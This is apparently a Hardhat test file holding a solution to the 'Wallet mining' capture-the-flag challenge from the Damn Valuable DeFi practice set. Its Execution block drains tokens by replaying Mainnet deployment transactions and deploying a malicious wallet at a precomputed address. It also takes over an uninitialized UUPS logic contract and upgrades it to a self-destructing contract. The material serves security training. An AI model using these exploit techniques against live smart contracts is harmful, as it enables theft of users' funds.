const { ethers, upgrades } = require('hardhat');
const { expect } = require('chai');
const { Factory, SecondTx, Mastercopy } = require('./deployments.json');

describe('[Challenge] Wallet mining', function () {
    let deployer, player;
    let token, authorizer, walletDeployer;
    let initialWalletDeployerTokenBalance;
    
    const DEPOSIT_ADDRESS = '0x9b6fb606a9f5789444c17768c6dfcf2f83563801';
    const DEPOSIT_TOKEN_AMOUNT = 20000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [ deployer, ward, player ] = await ethers.getSigners();

        // Deploy Damn Valuable Token contract
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy authorizer with the corresponding proxy
        authorizer = await upgrades.deployProxy(
            await ethers.getContractFactory('AuthorizerUpgradeable', deployer),
            [ [ ward.address ], [ DEPOSIT_ADDRESS ] ], // initialization data
            { kind: 'uups', initializer: 'init' }
        );
        
        expect(await authorizer.owner()).to.eq(deployer.address);
        expect(await authorizer.can(ward.address, DEPOSIT_ADDRESS)).to.be.true;
        expect(await authorizer.can(player.address, DEPOSIT_ADDRESS)).to.be.false;

        // Deploy Safe Deployer contract
        walletDeployer = await (await ethers.getContractFactory('WalletDeployer', deployer)).deploy(
            token.address
        );
        expect(await walletDeployer.chief()).to.eq(deployer.address);
        expect(await walletDeployer.gem()).to.eq(token.address);
        
        // Set Authorizer in Safe Deployer
        await walletDeployer.rule(authorizer.address);
        expect(await walletDeployer.mom()).to.eq(authorizer.address);

        await expect(walletDeployer.can(ward.address, DEPOSIT_ADDRESS)).not.to.be.reverted;
        await expect(walletDeployer.can(player.address, DEPOSIT_ADDRESS)).to.be.reverted;

        // Fund Safe Deployer with tokens
        initialWalletDeployerTokenBalance = (await walletDeployer.pay()).mul(43);
        await token.transfer(
            walletDeployer.address,
            initialWalletDeployerTokenBalance
        );

        // Ensure these accounts start empty
        expect(await ethers.provider.getCode(DEPOSIT_ADDRESS)).to.eq('0x');
        expect(await ethers.provider.getCode(await walletDeployer.fact())).to.eq('0x');
        expect(await ethers.provider.getCode(await walletDeployer.copy())).to.eq('0x');

        // Deposit large amount of DVT tokens to the deposit address
        await token.transfer(DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

        // Ensure initial balances are set correctly
        expect(await token.balanceOf(DEPOSIT_ADDRESS)).eq(DEPOSIT_TOKEN_AMOUNT);
        expect(await token.balanceOf(walletDeployer.address)).eq(
            initialWalletDeployerTokenBalance
        );
        expect(await token.balanceOf(player.address)).eq(0);
    });

    it('Execution', async function () {
        let nonce;
        for (nonce = 1; nonce < 1000; nonce++) {
            let addr = ethers.utils.getContractAddress({
                from: "0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B",
                nonce: nonce,
            });
            if (addr.toLowerCase() == "0x9b6fb606a9f5789444c17768c6dfcf2f83563801".toLowerCase()) {
                break;
            }
        }

        const safeDeployer = "0x1aa7451dd11b8cb16ac089ed7fe05efa00100a6a"; // source: Etherscan
        // fund the deployer with enough Ether for the transaction gas fees
        await player.sendTransaction({
            from: player.address,
            to: safeDeployer,
            value: ethers.utils.parseEther("1"),
        });

        // replay the transactions from Mainnet to deploy Mastercopy and Factory at the same address
        await (await ethers.provider.sendTransaction(Mastercopy)).wait();
        await (await ethers.provider.sendTransaction(SecondTx)).wait(); // cannot replay nonce 2 without nonce 1
        const deployedFactoryTx = await (await ethers.provider.sendTransaction(Factory)).wait();

        const deployedFactory = (await ethers.getContractFactory("GnosisSafeProxyFactory")).attach(deployedFactoryTx.contractAddress);
        const maliciousWallet = await (await ethers.getContractFactory("MaliciousWallet", player)).deploy();
        for (let i = 1; i < nonce; i++) {
            await deployedFactory.connect(player).createProxy(maliciousWallet.address, []);
        }
        // drain the deposit address
        await deployedFactory.connect(player).createProxy(maliciousWallet.address, maliciousWallet.interface.encodeFunctionData("attack", [player.address, token.address]));

        // find the logic authorizer contract
        const authorizerImplementationSlot = await ethers.provider.getStorageAt(authorizer.address, "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc");
        const authorizerImplementationAddress = "0x" + authorizerImplementationSlot.slice(-40);

        const authorizerFactory = await ethers.getContractFactory("AuthorizerUpgradeable");
        const authorizerLogic = authorizerFactory.attach(authorizerImplementationAddress);
                
        // the authorizer contract is vulnerable because the logic contract has not been initialized and 
        // anybody can claim ownership and selfdestruct the logic contract (thus leaving the proxy contract to point to an empty contract)
        // the solution is to call _disableInitializers() in constructor which was omitted
        const maliciousAuthorizer = await (await ethers.getContractFactory("MaliciousAuthorizer", player)).deploy();
        await authorizerLogic.connect(player).init([], []);
        await authorizerLogic.connect(player).upgradeToAndCall(maliciousAuthorizer.address, maliciousAuthorizer.interface.encodeFunctionData("attack"));

        for (let i = 1; i <= nonce; i++) {
            // drain the Wallet Deployer
            await walletDeployer.connect(player).drop("0x");
        }
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Factory account must have code
        expect(
            await ethers.provider.getCode(await walletDeployer.fact())
        ).to.not.eq('0x');

        // Master copy account must have code
        expect(
            await ethers.provider.getCode(await walletDeployer.copy())
        ).to.not.eq('0x');

        // Deposit account must have code
        expect(
            await ethers.provider.getCode(DEPOSIT_ADDRESS)
        ).to.not.eq('0x');
        
        // The deposit address and the Safe Deployer contract must not hold tokens
        expect(
            await token.balanceOf(DEPOSIT_ADDRESS)
        ).to.eq(0);
        expect(
            await token.balanceOf(walletDeployer.address)
        ).to.eq(0);

        // Player must own all tokens
        expect(
            await token.balanceOf(player.address)
        ).to.eq(initialWalletDeployerTokenBalance.add(DEPOSIT_TOKEN_AMOUNT)); 
    });
});
